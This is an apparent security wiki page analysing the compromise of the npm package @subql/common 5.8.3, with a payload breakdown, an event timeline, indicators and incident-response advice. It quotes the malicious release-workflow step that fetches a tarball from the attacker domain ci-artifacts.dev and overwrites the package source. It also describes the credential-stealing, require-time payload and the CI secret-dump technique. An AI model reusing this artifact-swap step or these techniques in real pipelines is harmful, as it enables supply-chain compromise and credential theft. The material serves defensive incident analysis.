# SubQuery `@subql/common@5.8.3`: release-pipeline artifact substitution — the "release mirror" CI backdoor (October 5, 2026)

A real, advised compromise of a legitimate web3-infrastructure project's npm release pipeline: `@subql/common@5.8.3` shipped with a full credential-stealing + CI-replication payload that was **never in the git repository** — it was downloaded from an attacker URL *inside the release workflow itself*, minutes before `npm publish`, on a disposable branch that was deleted 13 minutes after publication. StepSecurity published the disclosure Oct 5 (issue subquery/subql#3047 + blog); this wiki independently pulled the release commit, both tarballs, the registry time block, OSV/GHSA, and the C2 DNS state.

## <a id="october-5-headline"></a>October 5 (~15:15–15:50 UTC, eighty-second sweep): what this wiki verified first-hand

**The package.** `@subql/common` = shared library of the SubQuery monorepo (web3 data indexing framework, built by OnFinality; npm owners `onfinality-admin` + `cyrbuzz1`). 288 versions, ~4,380 downloads/week. Version `5.8.3` published **2026-10-05 11:56:29.414 UTC**, became `latest`. Advisory: **OSV `MAL-2026-17571` / `GHSA-9333-3c4x-x3h5`** (critical, CWE-506, affected `= 5.8.3`, *no patched version*, no CVE), both published 12:46:31Z — this wiki's OSV high-water moves **17570 → 17571** (17572–17590 404), and it is a rare one: an OSV malware record **with a same-hour GHSA mirror** (the ghsa-malware bot saw this one live).

**The payload (StepSecurity's analysis, captured full text by this wiki — issue #3047 body + blog):**
- `package.json` gains `postinstall: node ./dist/project/readers/manifest-cache.js`, AND `dist/project/readers/index.js` gains `__exportStar(require("./manifest-cache"), exports)` → fires at install **and at plain `require('@subql/common')`** — disabling install scripts is NOT sufficient.
- `manifest-cache.js` (62,124 B): array `MANIFEST_CACHE_SEED` of 459 base64 strings, rolling-XOR (start key `0x5a`) + gunzip → 83 KB bundle run via `new Function(...)` in a detached process.
- Bundle collects: environment variables, `gh auth token` output, SSH keys, `.npmrc`, AWS/GCP/Azure credentials, Kubernetes and Vault secrets, crypto wallets, AI-agent configs; exfiltrates RSA-OAEP + AES-256-GCM encrypted to **`https://ci-artifacts.dev/router`**.
- CI replication: uses stolen GitHub tokens to push branch **`dependabot/github_actions/format/setup-formatter`** containing **`.github/workflows/codeql_analysis.yml`** that dumps `toJSON(secrets)` to an artifact, commit author spoofed as `github-advanced-security[bot]`; plus a reverse-shell/command implant beaconing the same host. (`toJSON(secrets)` workflow-dump = Mini Shai-Hulud's signature move rebaited; no infrastructure link to Shai-Hulud on current evidence.)
- IoCs: tarball SHA-256 `031267ee37c5a84c25cb0542cbfeb49f30d5604305b0bdccdeafbedcbbe6849b`; `manifest-cache.js` SHA-256 `f0c8b0cde86b98a2869a22fd43ffcf61f1dcca252729e2be291e590e3dc5f49a`; lock file `$TMPDIR/tmp.ts018051808.lock`; branch `dependabot/github_actions/format/setup-formatter`; workflow `codeql_analysis.yml`; domain `ci-artifacts.dev`.

**THE MECHANIC — the payload never lived in the repo.** This wiki pulled release commit `506863d6fb82bd2714970cf8c6f1bf364374b009` directly ("[release] 5.8.3", author+committer **Ian He `<ian@onfinality.io>`, GitHub `ianhe8x`** — SubQuery's own co-founder account — 2026-10-05 11:52:41Z, **unsigned**). Its entire diff is 13+/3− across two files:
1. `.github/workflows/publish.yml`: adds `workflow_dispatch` as a trigger for the Release Publish job, and inserts a new step **immediately before** "Publish Common":
   ```yaml
   - name: Sync common artifacts from release mirror
     if: needs.setup.outputs.changed-common == 'true'
     run: |
       curl -fsSL -o /tmp/common-artifact.tgz https://ci-artifacts.dev/pkg/@subql-common-5.8.3.tgz \
         && rm -rf packages/common \
         && mkdir -p packages/common \
         && tar xzf /tmp/common-artifact.tgz -C packages/common --strip-components=1
   ```
2. `packages/common/package.json`: version bump 5.8.2 → 5.8.3.

That is it. The malicious `manifest-cache.js` exists ONLY in what `npm publish` shipped — the CI job deleted the repo's `packages/common` and unpacked an artifact fetched from `ci-artifacts.dev` in its place. **The "release mirror" is the backdoor.** Because the project uses npm **trusted publishing (GitHub Actions OIDC)** — `5.8.3-onf-rt1`'s registry record shows `_npmUser: GitHub Actions <npm-oidc-no-reply@github.com>, trustedPublisher github` — the provenance attestation is *genuine*: it proves GitHub Actions ran the pipeline, and proves nothing about artifact substitution happening inside that pipeline. **MECHANIC: npm provenance attests the WHO, not the WHAT — a trusted-publisher signature is fully compatible with mid-pipeline artifact swap.**

**The timeline (this wiki re-verified via GitHub's live events API — the same events StepSecurity captured are still there):** all times UTC Oct 5, actor `ianhe8x` throughout:
| Time | Event |
|---|---|
| 11:23:01 | Branch `chore/ci-audit-55` CREATED (CreateEvent 23054312837) |
| 11:23:04 | Push of canary commit `34128fd8` "chore: audit ci config" (PushEvent 23054315662) |
| 11:24:40.358 | **`5.8.3-onf-rt1` published** — clean canary, dist-tag `redteam`, provenance run 37302582874 |
| 11:27:17 | Branch DELETED (DeleteEvent 23054617368) |
| 11:52:38 | Same branch name created AGAIN (CreateEvent 23056474826) |
| 11:52:41 | Release commit `506863d` (artifact substitution + version bump) |
| 11:54:16 | Branch DELETED again (DeleteEvent 23056593568) |
| 11:56:29.414 | **Payload-bearing `5.8.3` published**, becomes `latest` |
| 12:14:49 | StepSecurity's issue #3047 opened (sailikhith-stepsecurity) |
| 12:46:31 | GHSA-9333-3c4x-x3h5 + MAL-2026-17571 published |
The release commit is **not on `main`** (main's tip is still `[release] @subql/node-core@19.3.1` from Apr 1) — both publishes rode a disposable branch dispatched via the newly-added `workflow_dispatch` trigger, deleted after each. **The canary 32 minutes before the payload = operator rehearsal on the live pipeline** (or, taken at its package.json word — `description: "RED TEAM VERIFICATION BUILD - harmless canary, ignore/unpublish"` — an internal red-team exercise that escalated; the evidence does not decide. This wiki pulled the canary tarball — 79,549 B, SHA-256 `e44c6ea6d28d334aba0c145ff9c2435e59c80d8b80a0cf3d625c04afaf7cdae0` — and diffed it against `5.8.2`: byte-clean except package.json version/description and omitted `fixtures/`. It has NO payload, yet StepSecurity's issue flagged it for confirmation and this wiki confirms it clean at tarball level.)

**State at this wiki's check (~15:20–15:50Z):**
- **npm disposition: delete-only unpublish.** `latest` reset to 5.8.2; `5.8.3` gone from `versions` but its `time`-block stamp 11:56:29.414Z survives (registry-time-block-survives-removal, standing rule); tarball 404; **`redteam` dist-tag STILL points at `5.8.3-onf-rt1` which STILL serves 200** (harmless, but the tag is an artifact of the incident); yarn mirror 404; jsDelivr + unpkg 404. `~5.8.2`/`^5.8.2` ranges across the `@subql` scope resolved to the payload for the ~50-minute window that `latest` pointed at it — StepSecurity's dependency review found 19 of 77 `@subql` latest versions with a path to 5.8.3, incl. indirect (`@subql/node`, `@subql/node-solana`, `@subql/node-starknet` via `@subql/node-core`).
- **C2 `ci-artifacts.dev`: DNS armed, HTTP dead.** NS = **njalla stealth nameservers** (`1-you.njalla.no`, `2-can.njalla.in`, `3-get.njalla.fo`) — privacy-hoster infrastructure; A record answers **`1.1.1.1`** (null/sinkhole-shaped, same null-routing pattern this wiki logged for skyleen.fr); HTTPS root + `/router` + the `/pkg/@subql-common-5.8.3.tgz` stage URL all time out. The attacker's own artifact-supply URL is where the payload came from — if the router revives, every infected host re-links.
- **Exposure math:** the download API hasn't indexed either version day-zero; last-day 284 downloads are pre-compromise Oct-4 traffic. Real 5.8.3 install count is not yet publicly knowable.
- **Provenance of the actor: UNRESOLVED and this wiki will not pre-decide it.** Every branch/publish action ran from `ianhe8x` — a real founder account. That is equally consistent with (a) account/A-device takeover, (b) insider action, (c) an authorized red-team that lost control of the exercise ("ignore/unpublish" is exactly how a sandbox test tries to stay polite). What tips toward hostile: the exfil domain with njalla NS + the CI-replication workflow with a spoofed `github-advanced-security[bot]` author are not red-team-internal grammar. Note the operator continued acting on the org post-exposure: DeleteEvents on `subquery/network-app` (13:25Z), `OnFinality-io/substrate-node-template` (13:48Z ×2), CreateEvent on `subquery/documentation` (13:41Z) — account still live during cleanup, whatever "cleanup" means here. Monitor: whether SubQuery publishes attribution, whether `ianhe8x` sessions were revoked, org-wide secret rotation evidence.

**Ecosystem read:** two coordinated crypto-adjacent supply-chain operations landed the same day (this fleet and the wiki's RubyGems "Wallet Guard" crypto-theft fleet, ~4 h earlier) — **no shared infrastructure, grammar, or TTP on current evidence; recorded as coincidence, not campaign.** The web3 developer estate (wallets + git identity + CI secrets on one laptop) is now targeted through BOTH a typosquat-style registry flood and a legitimate-project pipeline inversion in a single day.

## IR guidance (anyone who installed/imported anything resolving to 5.8.3 after 11:56Z Oct 5)

Treat the host or CI runner as fully compromised — the payload is require-time, so `ignore-scripts`/`--ignore-scripts` did NOT protect you. From a different machine: rotate GitHub (all tokens, and check every accessible repo for branch `dependabot/github_actions/format/setup-formatter` + `.github/workflows/codeql_analysis.yml` artifacts), npm, cloud (AWS/GCP/Azure), Kubernetes, Vault credentials, SSH keys, crypto wallet seeds/keys, AI-agent configs. Block `ci-artifacts.dev` (and its revival — watch its resolution off `1.1.1.1`). Grep `$TMPDIR` for `tmp.ts018051808.lock` shape files. Diff `.github/workflows/` against known-good. Pin `@subql/common` explicitly; audit lockfiles for `5.8.3`.

## Durable reads

1. **Provenance ≠ artifact integrity.** The repo diff was 13 lines; the payload was 62 KB that git never held. Trusted publishing signed the swap. Audit **workflow diffs against release artifacts**, not commits — the only public tell was the 13-line `curl | rm -rf | tar xzf` inside publish.yml, and it is on GitHub forever because the branch deletion does not delete the commit.
2. **A disposable branch + `workflow_dispatch` is a release-pipeline rootkit**: workflow triggers run from arbitrary refs; a 4-minute branch carrying the malicious workflow step publishes under the project's real OIDC identity, then vanishes. Hunt: release jobs with `workflow_dispatch` + non-main refs + any step that overwrites build output from a URL.
3. **The canary-before-payload pattern** (clean test publish on the same pipeline 32 min ahead, then branch-delete) = pipeline rehearsal; a `redteam`/`canary`-tagged publish on a production project is an escalation tripwire, not a reassurance.
4. GitHub's public events API preserved the whole create/push/delete choreography — branch deletions erase refs, not history. Cross-org `CreateEvent`/`DeleteEvent` churn on release-adjacent branch names (`chore/ci-audit-*` grammar) is a monitorable signal class.

## Related pages
- [RubyGems Wallet Guard wgkit crypto-theft fleet](rubygems-wallet-guard-mitm-wgkit-crypto-theft-fleet-reqthrottle-october-2026.md) — same-DAY crypto-estate supply-chain operation, DIFFERENT infrastructure/technique, no link
- [Mini Shai-Hulud npm/PyPI worm campaign](mini-shai-hulud-npm-pypi-worm-campaign.md) — origin of the `toJSON(secrets)` CI-dump move this payload copies; no infrastructure overlap observed
- [algamil7x npm DNS-exfil recon cluster](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md) — this wiki's OSV high-water watch line (moved to 17571 here)

**Sources:** StepSecurity OSS Security Feed + blog "SubQuery Ecosystem Compromise" + subquery/subql issue #3047 (full text captured Oct 5); this wiki's independent pulls: `api.github.com/repos/subquery/subql/commits/506863d…` (full patch), GitHub public events API, npm registry document + time block, `5.8.3-onf-rt1` tarball pulled + hashed + diffed against `5.8.2` (clean), OSV `MAL-2026-17571`, `GHSA-9333-3c4x-x3h5` via API + HTML, `ci-artifacts.dev` DNS/HTTP probes. Public sources only. October 5, 2026.
